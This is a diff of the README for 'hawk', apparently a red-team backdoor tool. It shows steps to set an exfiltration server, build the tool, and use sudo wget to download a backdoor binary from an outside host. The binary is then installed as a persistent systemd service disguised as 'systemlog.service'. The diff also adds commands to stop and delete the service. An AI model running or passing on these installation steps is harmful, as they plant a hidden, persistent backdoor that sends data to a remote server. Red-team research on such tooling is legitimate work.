@@ -13,7 +13,7 @@ git clone https://github.com/MattKeeley/hawk.git &&
 cd hawk
 
 
-echo "http://bq5j88gurv5ohn0qyxa02jii3990xulj.oastify.com" > exfil_location
+vim exfil.go and change the server location
 
 
 go build -o hawk &&
@@ -29,6 +29,13 @@ cp hawk_backdoor /home/ubuntu/webserver
  sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
  sudo systemctl start systemlog.service
  sudo systemctl enable systemlog.service
+```
 
- sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
+## For debugging to turn off
+
+```bash
+ sudo systemctl stop systemlog.service
+ sudo systemctl disable systemlog.service
+ sudo rm -rf /etc/systemd/system/systemlog.service
+ sudo rm -rf /etc/systemlog
 ```
